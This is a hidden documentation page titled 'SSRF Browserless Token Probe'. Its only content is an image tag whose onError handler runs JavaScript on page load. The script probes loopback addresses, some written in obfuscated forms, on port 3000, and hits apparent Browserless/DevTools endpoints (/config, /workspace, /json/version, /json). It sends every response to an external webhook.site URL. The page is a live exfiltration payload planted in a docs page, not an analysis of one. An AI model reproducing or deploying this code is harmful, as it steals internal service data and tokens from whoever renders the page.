---
title: SSRF Browserless Token Probe
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<img src="x" onError="(async()=>{
const wh='https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355';
const send=(t,d)=>fetch(wh+'?t='+t+'&d='+encodeURIComponent(String(d).slice(0,1000))).catch(()=>{});
const ips=['0.0.0.0','0177.0.0.1','2130706433','[::1]','[::]','localhost.','127.1','127.0.1'];
for(const ip of ips){
  try{
    const r=await fetch('http://'+ip+':3000/',{signal:AbortSignal.timeout(3000)});
    const t=await r.text();
    await send('bless_ip_'+ip,t);
  }catch(e){
    await send('bless_ip_fail_'+ip,e.toString());
  }
}
try{
  const r=await fetch('http://0.0.0.0:3000/config',{signal:AbortSignal.timeout(3000)});
  const t=await r.text();
  await send('bless_config',t);
}catch(e){await send('bless_config_fail',e);}
try{
  const r=await fetch('http://0.0.0.0:3000/workspace',{signal:AbortSignal.timeout(3000)});
  const t=await r.text();
  await send('bless_workspace',t);
}catch(e){await send('bless_workspace_fail',e);}
try{
  const r=await fetch('http://0.0.0.0:3000/json/version',{signal:AbortSignal.timeout(3000)});
  const t=await r.text();
  await send('bless_version',t);
}catch(e){await send('bless_version_fail',e);}
try{
  const r=await fetch('http://0.0.0.0:3000/json',{signal:AbortSignal.timeout(3000)});
  const t=await r.text();
  await send('bless_json',t);
}catch(e){await send('bless_json_fail',e);}
})()" />
`}</HTMLBlock>
